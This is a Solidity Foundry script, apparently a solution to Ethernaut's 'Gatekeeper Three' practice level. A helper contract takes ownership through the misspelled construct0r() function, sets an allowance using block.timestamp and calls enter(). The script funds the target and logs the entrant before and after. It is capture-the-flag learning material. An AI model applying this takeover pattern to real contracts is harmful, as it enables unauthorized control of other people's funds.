// SDPX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/28_GateKeeper_Three.sol";

contract Helper {
    GatekeeperThree public target;

    constructor(GatekeeperThree _target) {
        target = _target;
    }

    function exploit() external {
        target.construct0r();
        target.createTrick();
        target.getAllowance(block.timestamp);
        target.enter();
    }
}

contract POC is Script {
    GatekeeperThree public target;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = GatekeeperThree(payable(0x46EC8C285A54c4029b26D8B5aa94060BD7bF3536));
        Helper helper = new Helper(target);
        payable(address(target)).transfer(0.0011 ether);
        
        address entrant = target.entrant();
        console.log("before exploit: ", entrant);

        helper.exploit();

        entrant = target.entrant();
        console.log("after exploit: ", entrant);
        
        vm.stopBroadcast();
    }
}